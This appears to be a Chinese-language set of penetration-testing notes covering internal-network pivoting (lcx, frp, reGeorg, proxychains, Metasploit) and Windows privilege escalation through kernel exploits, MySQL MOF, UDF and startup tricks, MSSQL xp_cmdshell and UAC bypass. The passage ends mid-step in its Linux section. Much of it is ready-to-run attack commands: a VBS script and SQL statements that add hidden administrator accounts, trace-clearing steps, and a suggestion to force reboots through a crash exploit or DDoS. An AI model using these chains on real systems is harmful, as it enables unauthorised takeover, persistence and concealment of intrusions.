title="收集内容总结"></a>收集内容总结</h2><p>网卡信息、arp缓存、路由缓存、网站配置文件、数据库、访问日志、浏览器历史记录、netstat、hosts文件、history、hash、明文密码、网站配置账密、wifi、cmdkey</p><h1 id="内网转发"><a href="#内网转发" class="headerlink" title="内网转发"></a>内网转发</h1><ul><li>内网转发的目的</li></ul><blockquote><p>理论上通过网络连接的计算机都是可以互相访问的，但是因为技术原因没有实现。如局域网中某计算机仅开放web服务，则只能内网使用，外网无法直接访问。要让外网用户直接访问局域网服务，必须进行内网转发等操作<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/8da8788c-be83-4362-a021-8414f20b8fa9.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/8da8788c-be83-4362-a021-8414f20b8fa9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p></blockquote><ul><li><p>内网转发原理<br>通过服务器进行中转，将内部的<strong>端口映射到公网IP</strong>上，或者将内网端口<strong>转发至外部服务器</strong>。</p></li><li><p>内网转发的三种形式</p></li></ul><blockquote><ol><li>端口转发</li></ol><blockquote><p>用于目标机器对某一端口的访问进行了限制。可以将本机的端口或者是本机可以访问到的任意主机的端口转发到任意一台你需要访问的公网IP上</p></blockquote><ol start="2"><li>端口映射</li></ol><blockquote><p>将一个内网无法访问的端口映射到公网的某个端口，进而进行攻击。比如:3389端口</p></blockquote><ol start="3"><li>代理转发</li></ol><blockquote><p>主要用于在目标机器上做跳板，进而可以对内网进行攻击</p></blockquote></blockquote><ul><li>四种基本的网络情况</li><li><ul><li>攻击者有独立外网IP，拿到shell的服务器也有独立的外网IP</li></ul></li><li><ul><li>攻击者有独立外网IP，拿到shell的服务器在内网，只有几个映射端口</li></ul></li><li><ul><li>攻击者在内网，服务器也在内网只有几个映射端口</li></ul></li><li><ul><li>攻击者在内网，服务器有独立外网IP</li></ul></li></ul><p>四种情况有不同拿下服务器的方式</p><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><ul><li>原理<br>端口转发是转发一个<strong>网络端口</strong>从<strong>一个网络节点到另一个网络节点</strong>的行为。使一个外部用户从外部经过一个被激活的NAT路由器到达一个在私有内部IP地址(局域网内部）上的一个端口。<br>简单地说︰端口转发就是将一个端口（这个端口可以本机的端口，也可以是本机可以访问到的任意主机的端口）转发到<strong>任意一台可以访问到的IP</strong>上，通常这个IP是公网ip</li><li>端口转发场景∶<br>外网主机A已经可以任意连接内网主机B上的端口，但是无法访问内网主机C上的端口<br>此时可以将C主机的端口转发到B主机的端口，那么外网主机A访问B主机的某某端口就相当于访问了C主机的某某端口<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/d6a37fdf-34be-4c25-8d13-9c30d6f6b7fc.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/d6a37fdf-34be-4c25-8d13-9c30d6f6b7fc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li></ul><h3 id="端口转发工具"><a href="#端口转发工具" class="headerlink" title="端口转发工具"></a>端口转发工具</h3><h4 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h4><blockquote><p>lcx是一个居于socket套接字实现的端口转发工具，有windows和linux两个版本，windows叫lcx.exe,linux叫portmap<br>一个正常的socket隧道必须具备两端：服务器端和客户端</p></blockquote><h5 id="windows下："><a href="#windows下：" class="headerlink" title="windows下："></a>windows下：</h5><blockquote><ul><li>转发端口：<code>lcx.exe -slave 公网IP 端口 内网IP 端口</code></li><li>监听端口：<code>lcx.exe -listen 转发端口，本机任意没有没有被占用的端口</code></li><li>映射端口：<code>lcx.exe -tran 映射端口号 ip 目标端口</code></li></ul></blockquote><ul><li><p>本地端口映射:如果目标服务器由于防火墙的限制，部分端口的数据无法通过防火墙，可以将目标服务器相应端口的数据传到<strong>防火墙允许的其他端口</strong><br><code>lcx.exe -tran 映射端口号 目标ip 目标端口</code></p></li><li><p>内网端口转发：如下规则时，主机不能直接访问内网，这时就需要web服务器当<strong>跳板</strong>，也就是<strong>代理</strong>来使攻击机访问到内网主机<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/210124f1-baf9-436a-93c8-f7fd2ef87421.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/210124f1-baf9-436a-93c8-f7fd2ef87421.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"><br>基本命令：<br>·转发端口<code>lcx.exe -slave 公网ip 端口 内网ip 端口</code><br>·监听端口<code>lcx.exe -listen 转发端口 本机任意没有被占用端口</code></p></li></ul><blockquote><p>windows端口转发实例<br>环境︰内网主机不能访问外网，但是可以访问同网段的内网机器，同时80端口只能本地访问，但是8080端口对外开放。</p><blockquote><p>步骤一:被控服务器的80端口转发到本地的8080端口 <code>lcx -tran 8080 127.0.0.1 80</code><br>步骤二∶在内网被控服务器上连接内网能够对外访问的服务器 <code>lcx -slave 192.168.56.1 4444 192.168.56.101 8080</code><br>步骤三∶在能够对外访问的内网机器上监听端口 <code>lcx -listen 4444 12345</code><br>步骤四∶外网机器访问192.168.56.1的12345端口也就是从<strong>服务器12345-&gt;服务器4444-&gt;外网8080-&gt;内网80</strong><br>在外网192.168.64.230访问192.168.64.103:12345</p></blockquote></blockquote><h5 id="linux下："><a href="#linux下：" class="headerlink" title="linux下："></a>linux下：</h5><p>用法:<code>./portmap -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-log filename]</code><br>v:version</p><blockquote><p>-m:指定method action参数<br>method&#x3D;1:监听port1连接至主机2的port2(端口映射)<br>method&#x3D;2:监听Port1转发至port2<br>method&#x3D;3:连接主机1对应的端口和主机2对应的端口(端口转发)</p></blockquote><p>如:<code>./portmap -m 2 -p1 6666 -h2 公网ip -p2 7777</code>&#x2F;&#x2F;监听来自6666端口的请求并转发至7777</p><h4 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h4><ul><li>FRP(fast reverse proxy)是用go语言开发的<strong>反向代理应用</strong>，可以进行<strong>内网穿透</strong></li><li>frp支持tcp\udp\http\https</li></ul><p>frp用处</p><blockquote><ol><li>利用处于<strong>内网</strong>或<strong>防火墙</strong>的机器，对外网提供http\https\tcp\udp服务</li><li>对于http,https服务支持基于域名的虚拟主机，支持自定义域名，是多个域名共用一个80端口</li></ol></blockquote><p>下载后frp文件内frps,frps.ini为服务端程序和配置文件，frpc,frpc.ini是客户端程序及配置文件</p><blockquote><ul><li>服务端设置</li></ul><blockquote><p>修改frp.ini<br>文件格式：</p></blockquote><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;[common]</span><br><span class="line">&gt;&gt;bind_port = 7000 #frp服务器监听㐰</span><br><span class="line">&gt;&gt;dashboard_port = 7500 #web后台监听端口</span><br><span class="line">&gt;&gt;dashboard_user =admin #web后台用户名及密码</span><br><span class="line">&gt;&gt;dashboard_pwd = admin</span><br><span class="line">&gt;&gt;token = 123456 #客户端和服务器的连接口令</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>运行frps服务器端 <code>./frps -c frps.ini</code> #-c意思是加载配置文件<br>访问x.x.x.x:7500，使用自己设置的用户名和密码登录</p></blockquote><ul><li>客户端设置</li></ul><blockquote><p>修改frpc.ini文件</p></blockquote><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;[common]</span><br><span class="line">&gt;&gt;server_addr = 192.168.152.217</span><br><span class="line">&gt;&gt;#服务端IP地址</span><br><span class="line">&gt;&gt;server_port = 7000</span><br><span class="line">&gt;&gt;#服务器端口</span><br><span class="line">&gt;&gt;token = 123456</span><br><span class="line">&gt;&gt;#服务器上设置的连接口令</span><br><span class="line">&gt;&gt;[http]</span><br><span class="line">&gt;&gt;#自定义规则，[xxx]表示规则名</span><br><span class="line">&gt;&gt;type = tcp</span><br><span class="line">&gt;&gt;#type:转发的协议类型</span><br><span class="line">&gt;&gt;local_ip = 127.0.0.1</span><br><span class="line">&gt;&gt;local_port = 3389</span><br><span class="line">&gt;&gt;#本地应用的端口号</span><br><span class="line">&gt;&gt;remote_port = 7001</span><br><span class="line">&gt;&gt;#这条规则在服务端开放的端口号</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>配置完成frp.ini后，cmd运行frpc(和服务端一样-c指定配置文件)<br>在局域网外客户端连接服务端的remote_port端口</p></blockquote></blockquote><p>该工具可跨平台，也就是windows exe程序连接linux<br>上述操作也就<strong>相当于listen 7000转到7001</strong>然后连接</p><h4 id="metasploit-portfwd"><a href="#metasploit-portfwd" class="headerlink" title="metasploit portfwd"></a>metasploit portfwd</h4><ul><li>简介<br>一款内置于meterpreter shell中的工具，直接访问攻击系统无法访问的机器。在可以访问攻击机和靶机的受损主机上运行此命令，可以通过本机转发TCP连接，成为一个支点。</li></ul><blockquote><p>选项<br>-L∶要监听的本地主机(可选).<br>-l : 要监听的本地端口，与此端口的连接将被转发到远程系统·<br>-p∶要连接的远程端口，TCP连接将转发到的端口<br>-r∶要连接的远程主机的IP地址<br>参数<br>Add :该参数用于<strong>创建</strong>转发<br><code>portfwd add -I 本地监听端口号 -p 目标端口号 -r 目标机IP地址</code><br>Delete :这将从转发端口列表中删除<strong>先前的</strong>条目.<br><code>portfwd delete -I 本地监听端口号 -p 目标端口号 -r 目标机IP地址</code><br>List :<strong>列出</strong>当前转发的所有端口<br><code>portfwd list</code><br>Flush :这将删除转发列表中的<strong>所有</strong>端口</p></blockquote><p>这个不太稳定，不如frp，lcx不怎么用了。</p><h1 id="边界代理"><a href="#边界代理" class="headerlink" title="边界代理"></a>边界代理</h1><p>代理类别：HTTP代理、socks代理、telnet代理、ssl代理<br>代理工具：EarthWorm、reGeorg(http代理)、proxifier(win)、sockscap64(win)、proxychains(linux)</p><p>内网通过代理连接外部网络为正向代理，外网通过代理连接内网为反向代理。<br>负载均衡服务器：将用户的请求分发到空闲服务器上。</p><ul><li><p>socks代理<br>当通过代理服务器访问一个网站时，socks服务器起到了一个中间人的身份，分别与两方通信然后将结果告知另一方。只要配置好socks代理后无需指定<strong>被访问目标</strong>。<br>socks和http代理走的是tcp流量，意思是udp的协议不能用这两种代理</p></li><li><p>代理和端口转发的异同：</p></li></ul><table><thead><tr><th>代理</th><th>端口转发</th></tr></thead><tbody><tr><td>需要socks协议支持</td><td>无需协议支持</td></tr><tr><td>一对多，访问网络</td><td>一对一，帮助他人访问某端口</td></tr></tbody></table><p>socks代理可以理解为lcx端口转发，他在服务端监听一个服务端口，有连接请求时会从socks协议中解析出访问目标url的目标端口</p><p><strong>意思就是，有代理就不需要他娘的端口转发了，还指定端口转来转去脑子都转晕了，代理不需要那么多花里胡哨的。</strong></p><h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a><strong>proxychains</strong></h2><ul><li>proxychains是一个开源代理工具，可以在linux下全局代理。proxychains通过一个用户定义的代理列表强制连接指定的应用程序，支持http\socks4\socks5类型。</li><li>使用</li></ul><blockquote><ol><li>在使用工具前要对工具进行配置，配置文件:&#x2F;etc&#x2F;proxychains.conf<br>删除dynamic_chain的注释<br>底部添加代理服务器<br><code>proxychains 软件名</code>以代理启动任意软件</li></ol></blockquote><h2 id="regeorg工具"><a href="#regeorg工具" class="headerlink" title="regeorg工具"></a>regeorg工具</h2><ul><li>regeorg主要是把内网服务器端口通过http&#x2F;https隧道转发至本机，形成回路</li><li>用于目标服务器在<strong>内网或做了端口策略</strong>的情况下连接目标服务器内部开放端口</li><li>利用webshell建立一个socks代理进行内网穿透，则服务器必须支持aspx\php\jsp中的一种</li><li>regeorg分为服务端和客户端。<strong>服务端有php\aspx\jsp\node.js等多种，客户端为python</strong>，所以用的时候文件里面找对应脚本</li></ul><h3 id="regeorg使用"><a href="#regeorg使用" class="headerlink" title="regeorg使用"></a>regeorg使用</h3><p>和proxychains结合使用</p><ol><li><p>pip install安装</p></li><li><p>假设服务器是php版本，将regeorg里的php上传到服务器，直接访问显示”georg says,’all seems fine’”，为正常运行<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/1937af61-ef7b-46ef-9a2b-2c44da3cc586.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/1937af61-ef7b-46ef-9a2b-2c44da3cc586.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p></li><li><p>终端下运行:<code>python reGeorgSocksProxy.py -u 靶机reGeorg脚本地址 -p 本地监听端口</code></p></li><li><p>再起一个终端修改proxychains.conf配置文件，删除dynamic_chain的注释，在ProxyList最后加一行<code>socks5 127.0.0.1 本地监听端口</code>，并把其他的注释<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/86acdd55-5931-45f2-a10b-7c09d7eb41d5.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/86acdd55-5931-45f2-a10b-7c09d7eb41d5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p><p>代理就配置好了</p></li><li><p>使用<code>proxychains 命令</code>，流量会自动从配置文件端口经过(python跑的脚本终端别关)</p></li></ol><p>但是在msf外配置的代理,msf内部流量是不会走代理过的</p><h2 id="msf-route"><a href="#msf-route" class="headerlink" title="msf route"></a>msf route</h2><p>msf框架中自带路由转发功能，在已经获取meterpreter shell的基础上添加一条去往内网的路由<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/67351477-e0eb-4cf7-a460-01505220b4f7.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/67351477-e0eb-4cf7-a460-01505220b4f7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"><br>路由添加： <code>run autoroute -s 内网网端</code><br><code>run autoroute -p</code> 查看路由添加情况</p><h2 id="proxifiler"><a href="#proxifiler" class="headerlink" title="proxifiler"></a>proxifiler</h2><p>proxifiler为windows客户端代理工具，<strong>socks5客户端</strong>，可以让不支持通过代理服务器工作的程序通过https或socks5代理或代理链</p><ul><li>支持socks4\socks5\http\tcp\udp。有gui<br>使用:profil配置代理ip和端口。proxification rules设置代理规则，不需要代理的设为direct模式</li></ul><p>（但是个人在用shadowsocks…dddd)</p><p>﻿提权可以有好几种，本篇主要讲利用系统漏洞提权(最常规)和利用数据库提权。数据库这种利用第三方提权的方式通常比较少见</p><h1 id="windows权限提升"><a href="#windows权限提升" class="headerlink" title="windows权限提升"></a>windows权限提升</h1><p>当我们getshell一个网站后，大部分情况下我们的权限是非常低的，这个时候提权可以让我们如拥有修改文件之类的强大能力。</p><p>一般来说，提权通常是改变用户</p><blockquote><p>windows: user -&gt; system  user-&gt;administrator<br>linux: user-&gt;root</p></blockquote><ul><li>提权的方式通常有：</li></ul><ol><li>系统漏洞提权</li><li>数据库提权</li><li>第三方软件&#x2F;服务提权</li><li>系统配置错误提权</li></ol><p>如果目的是download服务器文件或者拿下webshell等没必要提权，如果是为了做肉鸡或者上远控</p><h2 id="系统漏洞提权"><a href="#系统漏洞提权" class="headerlink" title="系统漏洞提权"></a>系统漏洞提权</h2><p>常规流程：<strong>获得目标机shell-&gt;查看目标机补丁记录-&gt;判断没打的补丁，寻找EXP-&gt;利用exp提权</strong></p><ol><li>cmd中systeminfo查看补丁安装情况</li><li>使用补丁在线查询工具:<code>http://blog.neargle.com/win-powerup-exp-index/#</code></li><li>将systeminfo命令得到的补丁信息复制进去，就会给出可用的exp编号</li><li>github作者整合了大部分exp：<code>http://github.com/SecWiki/windows-kernel-exploits</code>(windows-kernel就是代表windows内核)</li><li>将exp上传至目标机</li></ol><ul><li>每个EXP的使用方法不同。如ms14-058上传了exp到靶机后在cmd使用<code>exp.exe &quot;命令&quot;</code>就能以system权限执行命令。其他exp的使用方法很可能不同</li><li>获得了高权限在当前网络环境切忌开3389去连，可以用msfvenom生成木马维权，或者创建新用户加入管理员组。不过都会被发现。。</li><li>靶机上在运行msf木马时要用高权限运行，否则反弹回来的shell也是低权限。所以要用之前传上去的exp运行msf木马</li></ul><h2 id="windows数据库提权"><a href="#windows数据库提权" class="headerlink" title="windows数据库提权"></a>windows数据库提权</h2><p>这种提权方式已经用的很少了</p><h3 id="mysql数据库提权"><a href="#mysql数据库提权" class="headerlink" title="mysql数据库提权"></a>mysql数据库提权</h3><p>mysql提权的必要条件:获取Mysql数据库最高权限<strong>root</strong>的账号密码</p><blockquote><p>获取方法：</p><ol><li>查看数据库配置文件</li><li>下载mysql安装路径下的数据文件并破解</li></ol><ul><li>安装路径下的data存放的是数据库的信息，root的账号密码存放在mysql下的user表中，完整路径&#x3D;安装路径+data+mysql+user.myd</li></ul><ol start="3"><li>暴力破解</li></ol></blockquote><p><strong>mysql的三种提权方式：</strong></p><ol><li>udf提权</li><li>mof提权</li><li>启动项提权</li></ol><h4 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h4><ul><li><p>原理：利用了c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下的<strong>nullevt.mof</strong>文件。该文件每几秒会<strong>执行</strong>一次，向其中写入<strong>cmd命令</strong>使其被执行</p></li><li><p>利用条件</p></li></ul><ol><li>windows&lt;&#x3D; 2003</li><li>对c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录有读写权限</li><li>可以时间写mof文件到相应目录，如：数据库允许外联，有webshell，有可写sql注入</li></ol><p>因为需要有写文件权限(into outfile)，所以可用到的环境很少</p><ul><li>提权方法</li></ul><blockquote><ol><li>上传mof文件</li><li>执行load_file和into dumpfile将文件导出到指定位置<br><code>select load_file(&#39;mof目标路径&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;</code></li></ol><p>nullevt.mof文件的内容<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/5b6b0a85-f8ae-48be-9f1d-6745b4226db6.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/5b6b0a85-f8ae-48be-9f1d-6745b4226db6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></p></blockquote><h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><ul><li><p>原理：UDF(user defined function)用户自定义函数通过添加新函数，对mysql服务器进行功能扩充，将mysql账号转化为system权限。</p></li><li><p>方式：通过root权限导出udf.dll到系统目录下，使udf.dell调用cmd</p></li><li><p>利用条件：</p></li></ul><ol><li>windows 2000\XP\2003</li><li>账号对mysql有插入和删除权限</li><li>对应目录有写权限</li></ol><blockquote><p>mysql版本对应的udf.dll导出路径：</p><table><thead><tr><th>数据库版本</th><th>操作系统</th><th>udf.dll导出路径</th></tr></thead><tbody><tr><td>&lt;5.0</td><td>所有操作系统</td><td>路径随意</td></tr><tr><td>&lt;&#x3D;5.1</td><td>windows2003</td><td>c:\windows\system32\udf.dll</td></tr><tr><td>&lt;&#x3D;5.1</td><td>windows2000</td><td>c:\winnt\system32\udf.dll</td></tr><tr><td>&gt;5.1</td><td>所有操作系统</td><td>mysql<strong>安装目录下的lib\plugin\udf.dll</strong></td></tr></tbody></table><p>mysql安装目录查询语句： <code>select @@basedir</code></p></blockquote><ul><li>udf 提权步骤</li></ul><ol><li>select user();\version();\basedir()判断数据库版本、用户和安装目录</li><li>如果\lib\plugin目录不存在，可以利用NTFS ADS流创建文件夹<br><code>select &#39;xxx&#39; into dumpfile &#39;mysql目录\\lib:$INDEX_ALLOCATION&#39;;</code><br><code>select &#39;xxx&#39; into dumpfile &#39;mysql目录\\lib\plugin:$INDEX_ALLOCATION&#39;;</code><br>或者是webshell直接创建</li><li>导入udf.dll文件。该文件在sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;目录下有，只是该dll文件是通过异或编码的，可以使用sqlmap&#x2F;extra&#x2F;cloak.py解密。</li><li>上传udf.dll到指定目录。有webshell就直接传，传不了就select load_file()。</li><li>创建自定义函数。<code>create function **sys_eval** returns string soname &#39;udf.dll&#39;;</code><br>必须要创建.dll文件中存在的函数才行，可以用十六进制编辑器打开udf.dll文件慢慢找函数，也可以用dumpbin.exe查看。soname指向动态链接库</li><li>执行高权限指令：<code>select sys_eval(&#39;whoami&#39;);</code><br>将该用户提升为管理员权限：<code>select sys_eval(&quot;net localgroup administrators ichunqiu /add&quot;)</code></li><li>清除痕迹<br><code>drop function sys_eval;</code><br><code>delete from mysql.func where name=&quot;sys_eval&quot;;</code></li></ol><h4 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h4><ul><li>原理：windows开机时候都会有一些开机启动的程序，那时候启动的程序权限都是system，因为是system把他们启动的，利用这点，我们可以将自动化脚本写入启动项，达到提权的目的。将一段vbs脚本导入开机启动项，如果管理员重启了服务器，那么就会自动调用，并执行其中的用户添加及提权命令</li><li>利用条件：</li></ul><ol><li>目标目录可读写</li><li>调用的cmd要有足够权限</li><li>重启服务器可以利用导致服务器蓝屏的exp，或者ddos</li></ol><ul><li>提权方式</li></ul><ol><li>直接将vbs提权脚本上传到启动项目录下</li><li>sql命令创建添加vbs脚本</li></ol><p>vbs提权脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set wsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;)</span><br><span class="line">os=&quot;WinNT://&quot;&amp;wsnetwork.ComputerName</span><br><span class="line">Set ob=GetObject(os) #得到adsi接口</span><br><span class="line">Set oe=GetObject(os&amp;&quot;/Administrators,group&quot;) #用户组</span><br><span class="line">Set od=ob.Create(&quot;user&quot;,&quot;name&quot;) #name为用户名</span><br><span class="line">od.SetPassword &quot;passwd&quot; #passwd为密码</span><br><span class="line">od.SetInfo #保存</span><br><span class="line">Set of=GetObject(os&amp;&quot;/name&quot;,user) #得到用户</span><br><span class="line">oe.add os&amp;&quot;/name&quot;</span><br></pre></td></tr></table></figure><ul><li>sql命令创建</li></ul><ol><li>连接到对方MySQL服务器,进入后查看数据库中有哪些数据表</li></ol><ul><li>命令:show tables</li><li>默认的情况下，test中没有任何表的存在。</li></ul><ol start="2"><li><p>进入test数据库，并创建一个新的表:<br><code>create table a(cmd text)</code>&#x2F;&#x2F;创建了一个新的表，名为a，表中只存放了一个字段，字段名为cmd，为text文本</p></li><li><p>在表中插入内容，用这三条命令来建立一个VBS的脚本程序:</p></li></ol><p><code>insert into a values(&quot;set wshshell=createobject(&quot;&quot;wscript.shell&quot;&quot;)&quot;);</code><br><code>insert into a values(&quot;a=wshshell.run(&quot;&quot;cmd.exe /c net user name passwd /add&quot;&quot;,0)&quot;);</code><br><code>insert into a values(&quot;b=wshshell.run(&quot;&quot;cmd.exe /c net localgroup administrators name /add&quot;&quot;,0)&quot;);</code></p><ol start="4"><li><p>输出表为一个VBS的脚本文件<br><code>select * from a into dumpfile &quot;C:\Documents and Settings\Administrator\「开始」菜单\程序\启动1.vbs&quot;;</code></p></li><li><p>利用其他手段重启电脑</p></li></ol><h3 id="sql-server提权"><a href="#sql-server提权" class="headerlink" title="sql server提权"></a>sql server提权</h3><ul><li>利用条件</li></ul><ol><li>必须获得sa的账号密码或者与sa相同给权限的账号密码，且mssql没有被降权</li><li>能执行sql语句。如webshell或者1433端口连接</li></ol><p>在windows，sa账号通常是被降权为db-owner的。而不是sysadmin</p><ul><li>获取sa号密的方法：</li></ul><blockquote><ol><li>webshell或源码获取。一般在网站的配置文件中存了明文账号密码，常用配置文件如：conn.aspx、config.aspx、config.php等<br>一般格式如：server&#x3D;localhost;UID&#x3D;sa;PWD&#x3D;passwd;database&#x3D;db</li><li>源码泄露</li><li>嗅探。在局域网中用Cain等工具进行arp嗅探的时候可以抓取到1433端口的数据库明文登录</li><li>暴力破解</li></ol></blockquote><h4 id="xp-cmdshell提权"><a href="#xp-cmdshell提权" class="headerlink" title="xp_cmdshell提权"></a>xp_cmdshell提权</h4><blockquote><ul><li>xp_cmdshell:</li></ul><ol><li>存储过程：是存储在SQLServer中预先定义好的”sql语言集合”，使用T-SQL语言编写好的脚本共同组成的集合体为存储过程</li><li>xp_cmdshell脚本：扩展存储过程的脚本，是危险性最高的脚本，可以执行操作系统的任何指令</li><li>xp_cmdshell在mssql2000中是默认开启的，在mssql2005后的版本中默认禁止。如果用户具有sa权限可以用sp_configure重新开启</li></ol></blockquote><p>xp_cmdshell提权过程：<br>（2005以前的版本):</p><ol><li>连接数据库：<br><code>select ame from master.dbo.sysdatabases</code>获取所有的数据库名</li><li>查看当前版本<code>select @@version</code><br>判断当前是否为sa<code>select is_srvrolemember(&#39;sysadmin&#39;)</code><br>判断是否有public权限<code>select is_srvrolemember(&#39;public&#39;)</code><br>判断是否有读写文件权限<code>select is_srvrolemember(&#39;db_owner&#39;)</code></li><li>查看数据库中是否有xp_cmdshell扩展存储插件，return 1则有<br><code>select count(*) from master.dbo.sysobjects where xtype=&#39;x&#39; and name=&#39;xp_cmdshell&#39;;</code></li></ol><p>（2005后的版本)：</p><ol><li>开启xp_cmdshell</li></ol><figure class="highlight plaintext"><figcaption><span>sp_configure 'show advance options',1;//允许修改高级参数</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmshell&#x27;,1;//打开xp_cmdshell扩展</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure><ol start="2"><li>xp_cmdshell执行命令</li></ol><figure class="highlight plaintext"><figcaption><span>master..xp_cmdshell 'net user name passwd</span><a href="/add'//添加用户name,密码passwd">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;net localgroup administrators name /add&#x27;//添加name到管理员组</span><br></pre></td></tr></table></figure><h3 id="windows-bypass-uac"><a href="#windows-bypass-uac" class="headerlink" title="windows bypass uac"></a>windows bypass uac</h3><p>uac(user acount control)可以阻止未授权的应用程序自动安装，并防止无意中更改系统设置</p><blockquote><p>uac的三种设置要求：</p><ol><li>始终通知</li><li>仅在系统试图更改我的计算机时通知（Uac默认设置，第三方使用高级别权限时会提示本地用户)</li><li>从不提示(用户为系统管理员时所有程序都会以最高权限运行)</li></ol></blockquote><p>相当于普通用户打开cmd和以管理员运行cmd的差别，普通用户以管理员身份开cmd就会受到uac的限制，输入管理员密码</p><h4 id="msf-bypass-uac"><a href="#msf-bypass-uac" class="headerlink" title="msf bypass uac"></a>msf bypass uac</h4><p>前提：已经获得了目标机器的meterpreter shell，当前权限为普通用户</p><ul><li>bypassuac模块通过进程注入，利用受信任的发布者证书绕过windows UAC,它将为我们生成另一个关闭UAC的shell</li><li>bypassuac_injection模块直接运行在内存的反射DLL中，不会接触目标机的硬盘，从而降低了被杀毒软件检测出来的概率</li><li>bypassuac_eventwr模块通过在当前用户配置单元下劫持注册表中的特殊键，在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC</li></ul><p>msf exploit:&gt;<code>use exploit/windows/local/bypassuac</code><br>然后根据msf exp对reverse_tcp(bind_tcp)、lhost等进行参数设置</p><h4 id="利用系统漏洞bypass-uac"><a href="#利用系统漏洞bypass-uac" class="headerlink" title="利用系统漏洞bypass uac"></a>利用系统漏洞bypass uac</h4><p>CVE编号:CVE-2019-1388,windwos证书对话框特权提升漏洞。补丁号KB4524235 KB4525233</p><ul><li>漏洞原理：此漏洞是因为UAC机制设定不严导致的。默认wdnows会在一个单独的桌面secure desktop上显示所有UAC提示。这些提示是由consent.exe的可执行文件生成的，该文件以NT AUTHORITY\SYSTEM身份运行，并有system的完整权限</li></ul><blockquote><p>如果在运行一个可执行文件时触发了UAC，在点击 展示证书发行者的详细信息 之后，证书里的Issued by字段，这个字段对应的值就是OID。证书会解析OID的值，windows没有禁用OID处的超链接，就可以利用提权</p></blockquote><p>要能连3389</p><p>@[toc]</p><h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><p>linux提权相对于windows的手法较单一，多了一个比较重要的suid提权。有很多时候提权并不是必须进行的步骤</p><h2 id="linux系统提权"><a href="#linux系统提权" class="headerlink" title="linux系统提权"></a>linux系统提权</h2><p>linux和内核提权跟windows一样，都要下载对应漏洞的脚本提权</p><p>uname -a 获取操作系统内核版本和内核架构<br>id 获取用户信息</p><ol><li>查找相关版本的内核漏洞</li></ol><ul><li>exp搜索链接：<code>https://www.exploit-db.com/</code> (type选local)</li><li>exp下载：<code>http://github.com/SecWiki/linux-kernel-exploits</code><br>（科学上网）</li></ul><ol start="2"><li>上传exp并编译<br>exp是.c文件，上传到服务器后需要用gcc编译。.cpp用g++<br>编译 <code>gcc pwn.c -o pwn</code> 